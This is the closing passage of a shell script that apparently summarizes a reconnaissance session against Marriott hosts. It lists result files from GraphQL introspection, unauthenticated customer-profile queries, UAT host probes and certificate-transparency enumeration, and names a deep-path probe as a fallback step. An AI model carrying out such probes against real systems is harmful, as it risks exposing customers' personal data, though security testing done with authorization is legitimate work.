print("4. Fallback: Saviynt M006, micmt.uat.marriott.com deep-path probe, CT enum")

PYEOF

echo ""
echo "================================================================"
echo "SESSION 20 COMPLETE"
echo "Key files:"
echo "  $OUTDIR/endpoint-hunt.txt               — GraphQL endpoint candidates from chunks"
echo "  $OUTDIR/chunk-list.txt                  — all auth-apc chunk paths found"
echo "  $OUTDIR/gw-graphql-body.json            — gateway-apc /graphql introspection response"
echo "  $OUTDIR/gql-profile-noauth.json         — GetProfileDetails unauth response"
echo "  $OUTDIR/gql-lookup-noauth.json          — LookupCustomerProfiles unauth response"
echo "  $OUTDIR/uat-micmt.uat.marriott.com-*    — UAT host probe results"
echo "================================================================"
